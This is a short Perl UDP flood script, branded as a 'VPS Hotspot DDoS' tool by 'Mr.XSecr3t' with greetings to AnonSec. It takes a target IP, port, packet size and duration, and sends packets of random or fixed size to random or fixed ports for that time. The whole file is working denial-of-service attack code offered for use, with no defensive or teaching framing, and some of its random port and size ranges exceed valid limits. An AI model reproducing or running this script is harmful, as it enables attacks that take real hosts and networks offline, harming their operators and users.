#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD GREEN "Made by Mr.XSecr3t\n";
print BOLD RED "Thanks To Mr.SHlalom\n";
print BOLD YELLOW "GreeTz : AnonSec | Allah SWT | You Who use this tools :p\n";	

##
# Script Base
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD WHITE<<EOTEXT; 

███████╗███╗   ███╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝████╗ ████║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
EOTEXT
print RED<<EOTEXT;
███████╗██╔████╔██║███████║██║     █████╔╝ █████╗  ██║  ██║
╚════██║██║╚██╔╝██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
███████║██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
                                                                                                                                                 
EOTEXT
print "Press CTRL+C to Stop Attack\n" unless $time;
print "$ip $port got hit with $size for $time seconds\n";
print "VPS Hotspot DDoS By Mr.XSecr3t\n";
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}